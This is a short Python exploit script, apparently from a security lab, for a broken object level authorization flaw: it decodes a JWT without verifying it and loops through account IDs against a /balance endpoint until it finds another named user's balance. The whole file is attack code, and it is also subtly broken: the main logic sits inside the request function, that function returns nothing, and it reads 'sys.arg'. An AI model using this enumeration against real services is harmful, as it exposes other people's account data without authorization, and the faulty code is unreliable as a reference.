#EXPLOIT :: Broken Object Level Auth I 

import jwt
import requests
import sys
import time

baseUrl = "http://192.37.163.3:8081"

def getBalance(acctID, token):
    params = {"acct":acctID, "token":token}
    r = requests.get(baseUrl + "/balance", params=params)
    r.json()

    if len(sys.argv) !=2:
        print("[*] Usage: Python exploit.py JWT_TOKEN")
        sys.exit(-1)

    token = sys.arg[1]

    for i in range(1000,9999):
        payload = jwt.decode(token, verify=False)
        if not ("exp" in payload and payload["exp"]>= int(time.time())):
            print("Expired Token!")
            break
        data = getBalance(i, token)
        if "Error" in data:
            continue
        if data["user"]=="James Cooper":
            print("="*10)
            print(data)
            print("="*10)
            break



            
